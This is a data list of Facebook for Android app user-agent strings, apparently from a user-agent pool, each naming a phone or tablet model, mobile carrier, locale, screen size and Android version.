"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5 FHD;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/EMOVIL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/4.4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I537;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1920,height=1080};FBLC/el_GR;FBCR/VODAFONE GR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Movil GSM ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Personal;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920I;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=1280,height=800};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=800,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=786};FBLC/es_LA;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H320;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=854};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VF-795;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Virgin;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2303;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/es_ES;FBCR/Personal;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2(4G-LTE);FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone ES;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/IDEA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5322;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_GB;FBCR/3;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_US;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1536,height=1952};FBLC/en_GB;FBCR/;FBMF/htc;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 9;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1920,height=1104};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/O2-IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Bell;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Emergency calls only;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI SCL-L01;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/eir;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/iD;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/hu_HU;FBCR/Telekom HU;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/pl_PL;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1196};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D722;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N750;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E700H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850W;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/sv_SE;FBCR/halebop;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500FN;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=768,height=1184};FBLC/en_GB;FBCR/Virgin;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Tesco Mobile;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/eir;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/eir;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/voda UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/vodafone UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/3 IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/AT&-T;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/TELKOMSEL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/VIRGIN;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/VIRGIN;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Videotron;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1563;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/eir;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_ES;FBCR/movistar;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC_A9u;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_ES;FBCR/movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1097;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/TIGO;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6902;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/pl_PL;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/pl_PL;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI GRA-L09;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
